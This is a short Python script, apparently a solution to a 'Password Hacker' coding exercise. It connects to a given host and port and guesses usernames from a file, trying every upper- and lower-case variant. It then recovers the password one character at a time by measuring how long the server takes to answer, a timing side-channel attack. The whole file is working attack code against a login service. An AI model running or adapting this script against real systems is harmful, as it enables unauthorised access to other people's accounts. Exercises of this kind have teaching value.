import time
import json
import socket
import sys
import itertools

host=sys.argv[1]
port=int(sys.argv[2])

my_socket=socket.socket()
my_socket.connect((host,port))
login=0
password=''
logins=open(r'C:\Users\dliga\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt','r')
for line in logins:
    q=map(lambda x: ''.join(x),itertools.product( *([letter.lower(), letter.upper()] for letter in line.strip())) )

    for i in q:
        cap={"login":i, "password":""}
        cap=json.dumps(cap)
        my_socket.send(cap.encode())
        resp = my_socket.recv(1024)
        if json.loads(resp.decode()) == {"result": "Wrong password!"}:
            login=i
            break
    if not login==0:
        break
condition=True
abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

start=time.perf_counter()
my_socket.send('$'.encode())
resp = my_socket.recv(1024)
end=time.perf_counter()
wrong_time=end-start

while condition:
    for i in abc:
        cap={
            "login":login,
            "password":password+i
        }
        cap=json.dumps(cap)
        start=time.perf_counter()
        my_socket.send(cap.encode())
        resp = my_socket.recv(1024)
        end=time.perf_counter()
        cur_time=end-start
        #print(cur_time)
        if cur_time>wrong_time*2:
            password=password+i
            #print(password)
        if json.loads(resp.decode('utf-8')) =={"result": "Connection success!"}:
            print(cap)
            condition=False
            break

